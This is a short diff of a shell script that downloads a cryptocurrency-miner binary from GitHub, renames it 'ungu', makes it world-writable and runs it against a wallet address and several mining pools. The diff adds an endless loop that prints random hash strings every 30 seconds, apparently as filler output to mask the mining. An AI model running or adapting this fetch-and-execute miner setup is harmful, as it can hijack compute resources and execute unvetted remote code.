@@ -2,3 +2,4 @@
 wget -O ungu https://github.com/xpherechain/Xphere-miner/releases/download/v0.0.2/miner-linux-amd64
 chmod 777 ungu
 ./ungu -targetMiner 0x427bC6a3FD4039F8A7A87cb7203e69f5c5A52018 -domain https://sgp-mining.x-phere.com,https://bkk-mining.x-phere.com,https://hkg-mining.x-phere.com,https://idn-mining.x-phere.com
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 30s; done
